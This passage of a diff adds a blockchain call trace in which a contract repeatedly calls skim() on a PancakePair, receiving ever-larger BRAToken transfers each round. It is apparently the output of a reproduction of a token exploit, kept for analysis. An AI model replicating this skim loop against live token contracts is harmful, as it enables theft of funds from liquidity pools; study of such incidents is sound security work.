+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 29391462269020488975518
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 20800320464230568757477) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 30015471882947406038018
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 21424330078157485819977) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 30658201785292130612318
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 22067059980502210394277) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 31320213584707196924018
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 22729071779917276705977) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 32002085738104715225018
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 23410943933314795006977) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 32704414056104159075018
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 24113272251314238856977) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 33427812223643586240518
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 24836670418853666022477) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 34172912336209196221118
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 25581770531419276003077) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 34940365452151774501118
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 26349223647361854283077) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 35730842161572630129518
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 27139700356782709911477) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 36545033172276111426818
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 27953891367486191208777) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 37383649913300697162818
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 28792508108510776944777) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 38247425156556020471018
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 29656283351766100252977) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 39137113657109003478518
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 30545971852319083260477) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 40053492812678575976318
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 31462351007888655758277) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 40997363342915235648818
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 32406221538125315430777) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 41969549989058995111718
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 33378408184269074893677) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 42970902234587067358418
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 34379760429797147140377) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 44002295047480981772618
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 35411153242691061554577) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 45064629644761713619118
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 36473487839971793401077) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 46158834279960867421118
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 37567692475170947203077) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 47285865054215995837118
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 38694723249426075619077) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 48446706751698778105418
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 39855564946908857887377) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 49642373700106043841818
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 41051231895316123623777) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 50873910656965527550418
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 42282768852175607332377) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
